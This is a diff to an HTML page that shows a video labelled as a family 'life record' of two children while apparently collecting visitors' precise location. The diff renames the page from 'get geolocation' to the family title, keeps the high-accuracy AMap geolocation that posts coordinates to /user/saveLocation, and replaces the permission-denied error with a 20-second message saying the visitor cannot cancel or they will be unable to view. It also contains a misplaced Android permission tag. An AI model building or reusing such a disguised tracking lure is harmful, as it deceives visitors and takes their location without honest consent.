@@ -1,9 +1,12 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
+	<!--允许程序打开网络套接字-->
+<uses-permission android:name="android.permission.INTERNET" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
-    <title>获取地理位置</title>
+    <title>怡然，浩然，的生活记录</title>
+<!--     <title>获取地理位置</title> -->
     <style type="text/css">#iCenter{width:100%; height: 910px; border:1px #000 solid;margin:20px auto;}</style>
     <script type="text/javascript" src="http://webapi.amap.com/maps?v=1.4.3&key=166c25a0a5761bd92ee5e607e995b4e2"></script>
     @include("/comm/head.html"){}
@@ -11,7 +14,7 @@
 <body>
 <div>
 <div>
-您正在观看孩子们的视频:<br />
+您正在观看怡然，浩然，的生活记录:<br />
 <video width="320" height="240" controls>
     <source src="/static/wenwu/mp4/my.mp4" type="video/mp4">
 </video>
@@ -30,6 +33,7 @@
 </div>
 <script type="text/javascript">
     var mapObj = new AMap.Map('iCenter');
+    
     mapObj.plugin('AMap.Geolocation', function () {
         geolocation = new AMap.Geolocation({
             enableHighAccuracy: true, // 是否使用高精度定位，默认:true
@@ -64,10 +68,10 @@
     }
     
     function setTimeSubmit(res){
-//     	console.log(res);
+    	console.log(res);
 //     	var locationHtml = $("#userLocation").html();
     	$.post("/user/saveLocation",{location:res,locationHtml:""},function(result){
-    		console.log(result);
+//     		console.log(result);
     	    if(result.code== 200){
 //     	    	layer.msg("保存成功");
     	    }else{
@@ -77,7 +81,12 @@
     }
  
     function onError(obj) {
-        alert(obj.info + '--' + obj.message);
+//         alert("你已选择取消查看信息了,FAILED--Geolocation permission denied.");
+		var mapObj = new AMap.Map('iCenter');
+        layer.msg("你不能选择取消,否则将无法查看",{time:20000},function(){
+//         	window.location.reload();
+        });
+       
         console.log(obj);
     }
 </script>
